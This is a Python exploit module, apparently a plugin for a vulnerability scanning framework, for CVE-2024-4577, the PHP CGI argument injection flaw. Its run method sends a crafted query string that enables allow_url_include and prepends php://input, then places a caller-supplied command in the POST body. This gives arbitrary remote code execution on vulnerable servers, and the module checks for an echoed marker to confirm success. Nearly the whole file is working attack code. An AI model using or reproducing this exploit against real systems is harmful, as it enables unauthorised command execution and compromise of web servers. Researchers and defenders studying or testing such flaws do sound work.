#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
requests.packages.urllib3.disable_warnings()
class Cve_2024_4577:
    """
    PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
    Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
    Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber)
    Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
    Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
    """

    def run(self, url,cmd):
        try:
            s = requests.Session()
            s.verify = False

            res = s.post(f"{url}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
                         data=f"{cmd};echo 1337; die;",verify=self.ssl,timeout=self.timeout,proxies=self.proxy,headers=self.headers)
            if ('1337' in res.text):
                OutPrintInfoSuc("PHP", f"存在CVE-2024-4577 {url}")
                if self.batch:
                    OutPutFile("PHP",f"存在CVE-2024-4577 {url}")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("PHP", '不存在CVE-2024-4577')
                return False
        

        except Exception:
            if not self.batch:
                OutPrintInfo("PHP", '目标请求出错')
            return False


    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        code = target["cmd"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            banner = """			 __         ___  ___________                   
            	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
            	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
            	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
            	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
            				  \\/          \\/     \\/                            

                    watchTowr-vs-php_cve-2024-4577.py
                    (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
                      - Aliz Hammond, watchTowr (aliz@watchTowr.com)
                      - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
                    CVEs: [CVE-2024-4577]  """

            print(banner)
            print("(^_^) prepare for the Pwnage (^_^)\n")
            OutPrintInfo("PHP", '开始检测CVE-2024-4577...')
        self.run(url,code)
        if not self.batch:
            OutPrintInfo("PHP", 'CVE-2024-4577检测结束')